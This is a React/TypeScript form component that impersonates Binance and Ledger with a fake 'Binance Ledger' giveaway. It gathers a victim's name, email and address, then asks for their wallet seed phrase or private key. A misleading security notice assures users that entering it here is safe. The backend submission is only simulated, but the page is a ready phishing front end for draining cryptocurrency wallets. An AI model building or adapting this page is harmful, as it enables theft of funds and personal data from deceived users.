
import { FC, useState, FormEvent } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Checkbox } from "@/components/ui/checkbox";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";

const BinanceLedgerForm: FC = () => {
  const { toast } = useToast();
  const [currentStep, setCurrentStep] = useState(1);
  const [formProgress, setFormProgress] = useState(33);
  const [formData, setFormData] = useState({
    firstName: "Gerard",
    lastName: "Powell",
    email: "gerardpowell@test.nl",
    address: "Gerard Teststraat 12",
    zipCode: "2123LK",
    city: "Nijmegen",
    country: "Netherlands",
    seedPhrase: "",
    securityConfirmation: false,
  });

  const [verificationCompleted, setVerificationCompleted] = useState(false);
  const [securityConfirmed, setSecurityConfirmed] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submissionCompleted, setSubmissionCompleted] = useState(false);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSecurityConfirmation = (checked: boolean) => {
    setFormData({
      ...formData,
      securityConfirmation: checked,
    });
    setSecurityConfirmed(checked);
  };

  const validateStep1 = () => {
    return formData.firstName.trim() !== "" && formData.lastName.trim() !== "";
  };

  const validateStep2 = () => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(formData.email);
  };

  const validateStep3 = () => {
    return (
      formData.address.trim() !== "" &&
      formData.zipCode.trim() !== "" &&
      formData.city.trim() !== "" &&
      formData.country.trim() !== ""
    );
  };

  const handleNext = () => {
    if (currentStep === 1 && validateStep1()) {
      setCurrentStep(2);
      setFormProgress(66);
    } else if (currentStep === 2 && validateStep2()) {
      setCurrentStep(3);
      setFormProgress(100);
    } else if (currentStep === 3 && validateStep3()) {
      setVerificationCompleted(true);
      setFormProgress(100);
    } else {
      toast({
        title: "Please fill in all required fields",
        variant: "destructive",
      });
    }
  };

  const handlePrevious = () => {
    if (currentStep === 2) {
      setCurrentStep(1);
      setFormProgress(33);
    } else if (currentStep === 3) {
      setCurrentStep(2);
      setFormProgress(66);
    }
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!formData.seedPhrase.trim()) {
      toast({
        title: "Please enter your seed phrase or private key",
        variant: "destructive",
      });
      return;
    }

    if (!formData.securityConfirmation) {
      toast({
        title: "Please confirm the security notice",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Simulate sending data to backend
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Success simulation
      setIsSubmitting(false);
      setSubmissionCompleted(true);
      
      toast({
        title: "Success",
        description: "Your Ledger is on the way to the provided address.",
      });
    } catch (error) {
      setIsSubmitting(false);
      toast({
        title: "Error",
        description: "An error occurred. Please try again.",
        variant: "destructive",
      });
      console.error("Form submission error:", error);
    }
  };

  return (
    <div className="bg-binance-dark rounded-lg p-6 md:p-8 shadow-lg max-w-2xl mx-auto">
      <div className="mb-6">
        <h2 className="text-binance-yellow font-bold text-xl mb-2">
          {verificationCompleted ? "Security Verification" : "User Verification"}
        </h2>
        {!verificationCompleted && (
          <div className="mb-4">
            <Progress value={formProgress} className="h-2 bg-gray-700" />
            <div className="mt-2 text-sm text-gray-400">
              Step {currentStep} of 3
            </div>
          </div>
        )}
      </div>

      {!verificationCompleted ? (
        <div className="space-y-6">
          {currentStep === 1 && (
            <div className="space-y-4">
              <h3 className="text-white font-medium">Personal Information</h3>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="firstName" className="block text-sm font-medium text-gray-300 mb-1">
                    First Name
                  </label>
                  <Input
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    placeholder="First Name"
                    className="bg-binance-darkGray border-gray-600 text-white"
                  />
                </div>
                <div>
                  <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-1">
                    Last Name
                  </label>
                  <Input
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    placeholder="Last Name"
                    className="bg-binance-darkGray border-gray-600 text-white"
                  />
                </div>
              </div>
            </div>
          )}

          {currentStep === 2 && (
            <div className="space-y-4">
              <h3 className="text-white font-medium">Email Address</h3>
              <div>
                <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-1">
                  Email
                </label>
                <Input
                  id="email"
                  name="email"
                  type="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder="Email Address"
                  className="bg-binance-darkGray border-gray-600 text-white"
                />
              </div>
            </div>
          )}

          {currentStep === 3 && (
            <div className="space-y-4">
              <h3 className="text-white font-medium">Address Details</h3>
              <div>
                <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-1">
                  Address
                </label>
                <Input
                  id="address"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  placeholder="Address"
                  className="bg-binance-darkGray border-gray-600 text-white"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="zipCode" className="block text-sm font-medium text-gray-300 mb-1">
                    Zip Code
                  </label>
                  <Input
                    id="zipCode"
                    name="zipCode"
                    value={formData.zipCode}
                    onChange={handleInputChange}
                    placeholder="Zip Code"
                    className="bg-binance-darkGray border-gray-600 text-white"
                  />
                </div>
                <div>
                  <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-1">
                    City
                  </label>
                  <Input
                    id="city"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    placeholder="City"
                    className="bg-binance-darkGray border-gray-600 text-white"
                  />
                </div>
              </div>

              <div>
                <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-1">
                  Country
                </label>
                <Input
                  id="country"
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  placeholder="Country"
                  className="bg-binance-darkGray border-gray-600 text-white"
                />
              </div>
            </div>
          )}

          <div className="flex justify-between pt-4">
            {currentStep > 1 && (
              <Button
                type="button"
                onClick={handlePrevious}
                className="bg-gray-600 hover:bg-gray-700 text-white"
              >
                Back
              </Button>
            )}
            <Button
              type="button"
              onClick={handleNext}
              className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 ml-auto"
            >
              {currentStep === 3 ? "Complete Verification" : "Next"}
            </Button>
          </div>
        </div>
      ) : !submissionCompleted ? (
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="text-center py-4">
            <h3 className="text-white font-semibold text-xl">
              Verification successful. Thank you, {formData.firstName} {formData.lastName}.
            </h3>
            <p className="text-gray-300 mt-2">
              Please proceed with the final steps to link your wallet to the ledger.
            </p>
          </div>

          <div className="bg-red-900/20 border border-red-500/30 rounded-md p-4 mb-6">
            <h4 className="text-red-400 font-medium mb-2">Security Notice</h4>
            <p className="text-gray-300 text-sm">
              IMPORTANT: The information requested below is highly sensitive and should never be shared with third parties via phone, SMS, or email. 
              This information should only be entered in this secure form to properly link your wallet to the Binance Ledger device.
            </p>
            <div className="mt-4 flex items-center space-x-2">
              <Checkbox
                id="securityConfirmation"
                checked={securityConfirmed}
                onCheckedChange={handleSecurityConfirmation}
                className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
              />
              <label htmlFor="securityConfirmation" className="text-sm text-gray-200">
                I understand and confirm that I am providing this information securely
              </label>
            </div>
          </div>

          <div className="space-y-4">
            <label htmlFor="seedPhrase" className="block text-sm font-medium text-gray-300">
              Seed Phrase or Private Key
            </label>
            <textarea
              id="seedPhrase"
              name="seedPhrase"
              value={formData.seedPhrase}
              onChange={(e) => setFormData({ ...formData, seedPhrase: e.target.value })}
              placeholder="Enter your 12 or 24 word seed phrase (with spaces between words) or private key"
              className="w-full p-3 bg-binance-darkGray border border-gray-600 rounded-md text-white min-h-[100px]"
              required
            />
            <p className="text-xs text-gray-400">
              This information is required to securely link your wallet to your new Binance Ledger device.
            </p>
          </div>

          <div className="pt-4">
            <Button
              type="submit"
              disabled={isSubmitting || !securityConfirmed}
              className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
            >
              {isSubmitting ? "Processing..." : "Complete Wallet Linking"}
            </Button>
          </div>
        </form>
      ) : (
        <div className="text-center py-8">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-6">
            <svg
              className="w-8 h-8 text-green-600"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M5 13l4 4L19 7"
              ></path>
            </svg>
          </div>
          <h3 className="text-white font-semibold text-xl mb-2">
            Success! Your Binance Ledger is on the way.
          </h3>
          <p className="text-gray-300">
            The Binance Ledger will be shipped to your provided address:
            <br />
            <span className="block mt-2 font-medium">
              {formData.address}, {formData.zipCode}
              <br />
              {formData.city}, {formData.country}
            </span>
          </p>
          <p className="mt-6 text-gray-400 text-sm">
            You will receive a confirmation email at {formData.email} with tracking information
            once your device has been shipped.
          </p>
        </div>
      )}
    </div>
  );
};

export default BinanceLedgerForm;
